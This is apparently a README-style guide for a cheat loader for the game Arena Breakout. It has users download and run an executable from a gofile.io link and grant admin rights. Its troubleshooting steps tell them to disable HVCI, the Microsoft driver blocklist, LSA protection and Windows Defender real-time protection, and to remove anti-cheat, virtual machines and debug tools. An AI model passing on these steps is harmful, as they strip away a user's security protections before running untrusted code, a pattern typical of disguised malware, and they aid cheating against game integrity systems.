    content: "# UnnamedTech Arena Breakout\n\nGuide to Using Activation and Running Software\nInstall Medal.tv required for cheat work!\n\nMake sure you logged into Medal.tv\n\n⚠️Important: Ensure that the Game Launcher and Game are completely closed before launching the loader.\n\nInstall and Run the Loader https://gofile.io/d/ALawtb\n\nOpen Medal with Admin Rights\n\nOpen game once loader closes\n\nOnce you're in game lobby press F2 and wait until menu appears (10-60 seconds)\n\nEnjoy Button to Open & Hide menu: Insert\n\nIf no menu - make sure your game resolution is borderless or windowed\n\nError Fix\nTroubleshooting\nRandom Crashes / Freezes\n\nIf you experience random crashes or freezes, follow these recommendations:\n\nSet graphics settings to the lowest possible values\n\nLimit in-game FPS to a stable value\n\nCompletely disable:\n\nSuper Resolution\n\nDLSS\n\nFSR\n\nException: AMD FidelityFX Super Resolution 2.0 in Ultra Performance mode may work correctly in some cases.\n\nInstant Crash on Game Launch\n\nIf you are using the Official Launcher / WeGame, do not launch the game without the cheat after the first injection, otherwise the game may start crashing every time on launch.\n\nIf you already launched the game without the cheat after the first injection and it now instantly closes, do the following:\n\nRestart your PC\n\nVerify game files through the launcher\n\nLaunch the cheat again as usual\n\nError #1\n\nFollow these steps in order, restarting your PC after each change:\n\nDisable HVCI (Core Isolation)\n\nDisable Microsoft Driver Blocklist\n\nDisable Local Security Authority (LSA)\n\nLoader Crashes After Key Verification\n\nInstall the latest Microsoft Visual C++ Redistributable packages for both architectures:\n\nx64 → https://aka.ms/vs/17/release/vc_redist.x64.exe\n\nx86 → https://aka.ms/vs/17/release/vc_redist.x86.exe\n\nAlso remove the following software if installed:\n\nVMWare (virtual machine software)\n\nAny Debug Tools\n\nFinal Checklist Before Starting the Loader\n\nBefore launching the loader, make sure that:\n\nThe game and launcher are fully closed\n\nWindows Defender Real-Time Protection is disabled\n\nFACEIT Anti-Cheat is uninstalled\n\nIf all steps are followed exactly, most issues will be resolved.",
